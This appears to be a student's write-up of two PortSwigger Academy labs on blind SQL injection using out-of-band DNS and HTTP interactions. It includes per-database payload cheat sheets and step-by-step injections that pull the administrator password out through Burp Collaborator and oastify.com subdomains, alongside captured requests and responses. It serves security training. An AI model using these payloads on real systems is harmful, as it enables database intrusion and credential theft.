# Blind SQL Injection with out-of-band

# Review

Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.

The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This will cause the database to perform a lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

You can use **Burp Collaborator** to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

# Lab 1: Out-of-band interaction

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

> **Note**
> 
> 
> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
> 

### Cheat Sheet

| Oracle | (https://portswigger.net/web-security/xxe) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
The following technique works on fully patched Oracle installations, but requires elevated privileges:SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') |
| --- | --- |
| Microsoft | exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' |
| PostgreSQL | copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' |
| MySQL | The following techniques work on Windows only:LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' |

---

****************************************The original request****************************************

```
GET /login HTTP/2
Host: 0ab5009a048199528000dfb9006800aa.web-security-academy.net
Cookie: TrackingId=KrN0QUPy6owEFsYC; session=DSs3e5PeG5u4xtwCkBawMVxsBE49KB0z
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0ab5009a048199528000dfb9006800aa.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

****************************The original response****************************

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3152

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Blind SQL injection with out-of-band interaction</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Blind SQL injection with out-of-band interaction</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="CG4Ee5Zu2jqNq3pMpq3DN9kSOL6tyXM0">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

Open the ******Burp Collaborator client****** by click on the ********Burp******** menu (version `2022.6`)

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled.png)

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled%201.png)

Click on the `Copy to clipboard` to take the ******************sub-domain URL****************** of the **********************************************Burp Collaborator server**********************************************

Modify the request at `TrackingId` with each of the ************************cheat sheet************************ above

```
Cookie: TrackingId=x'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLABORATOR_SUBDOMAIN/">+%25remote%3b]>'),'/1')+FROM+dual--;
```

Send the request and solve the lab

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled%202.png)

# Lab 2: out-of-band data exfiltration

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

> **Note**
> 
> 
> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
> 

### Cheat sheet

| Oracle | SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual |
| --- | --- |
| Microsoft | declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') |
| PostgreSQL | create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f(); |
| MySQL | The following technique works on Windows only:SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' |

---

****************************************The original request****************************************

```
GET /login HTTP/2
Host: 0a4f0090043c6ad081188e380099005b.web-security-academy.net
Cookie: TrackingId=44BKSFxzZvYM8P7C; session=8AQ0YSf1f4RUiJbxP33uQoyTU9z3BY5m
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a4f0090043c6ad081188e380099005b.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

******************************************The original response******************************************

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3182

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Blind SQL injection with out-of-band data exfiltration</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Blind SQL injection with out-of-band data exfiltration</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="tDeRslKCsi0w8yJqVD6rTppshyaOLJbi">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

Verify the database type (Use the previous lab queries cheat sheet)

```
Cookie: TrackingId=x'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLABORATOR_SUBDOMAIN/">+%25remote%3b]>'),'/1')+FROM+dual--;
```

There are ************************Interactions************************ on the ******************Poll Collaborator******************’s table

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled%203.png)

⇒ The server is using ************Oracle************ database

Verify the username `administrator` with the `SELECT` statement stands front of the `BURP COLLABORATOR SUB-DOMAIN` concatenated by the `||` symbols

```
'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT username FROM users WHERE username='administrator')||'.0uvomq4qyyjpbhtif1krrlz970dr1g.oastify.com/"> %remote;]>'),'/1') FROM dual--
```

Which would be `URL encoded` as:

```
44BKSFxzZvYM8P7C'UNION%20SELECT%20EXTRACTVALUE(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20%5b%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f'%7c%7c(SELECT%20username%20FROM%20users%20WHERE%20username%3d'administrator')%7c%7c'.0uvomq4qyyjpbhtif1krrlz970dr1g.oastify.com%2f%22%3e%20%25remote%3b%5d%3e')%2c'%2f1')%20FROM%20dual--
```

Check the ************************Interactions************************ Table → Verify that the username `administrator` exists

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled%204.png)

So the `SELECT` query worked successfully → The query is valid syntax

Now, simply replace the `username` key word to be `password` to retrieve the password from the database without using any others **************SQL Injection************** methods such as **************************************Conditional Errors**************************************, **************************************Visible Error Based**************************************, ********************Time Delay********************,… because the exfiltrated data would be retrieve directly through our **************************************Burp Collaborator Server**************************************.

![Untitled](Blind%20SQL%20Injection%20with%20out-of-band%20images/Untitled%205.png)

Use the password to login as `administrator` to solve the lab